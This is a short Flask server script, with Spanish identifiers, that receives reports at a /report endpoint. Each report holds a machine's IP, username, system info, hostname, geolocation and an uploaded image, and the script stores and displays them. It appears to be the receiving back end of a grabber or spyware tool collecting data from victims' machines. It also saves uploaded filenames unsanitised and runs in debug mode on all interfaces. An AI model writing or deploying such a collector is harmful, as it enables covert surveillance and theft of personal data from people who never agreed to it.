from flask import Flask, request, render_template
from datetime import datetime
import os

app = Flask(__name__)
reportes = []

@app.route("/")
def index():
    return render_template("index.html", reportes=reportes)

@app.route("/report", methods=["POST"])
def recibir_reporte():
    ip = request.form.get("ip", "No recibido")
    username = request.form.get("username", "No recibido")
    system_info = request.form.get("system_info", "No recibido")
    hostname = request.form.get("hostname", "N/A")
    ciudad = request.form.get("ciudad", "N/A")
    region = request.form.get("region", "N/A")
    pais = request.form.get("pais", "N/A")
    loc = request.form.get("loc", "N/A")
    hora = request.form.get("hora", str(datetime.now()))

    print("[*] Reporte recibido:")
    print("IP:", ip)
    print("Usuario:", username)
    print("Sistema:", system_info)
    print("Hostname:", hostname)
    print("Ciudad:", ciudad)
    print("Región:", region)
    print("País:", pais)
    print("Ubicación:", loc)
    print("Hora:", hora)

    image_path = None
    if "image" in request.files:
        image = request.files["image"]
        filename = f"static/{datetime.now().strftime('%Y%m%d%H%M%S')}_{image.filename}"
        image.save(filename)
        image_path = filename
    else:
        print("[!] Imagen no recibida.")

    reporte = {
        "ip": ip,
        "username": username,
        "system_info": system_info,
        "hostname": hostname,
        "ciudad": ciudad,
        "region": region,
        "pais": pais,
        "loc": loc,
        "hora": hora,
        "imagen": image_path
    }
    reportes.append(reporte)
    return "OK"

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=10000)
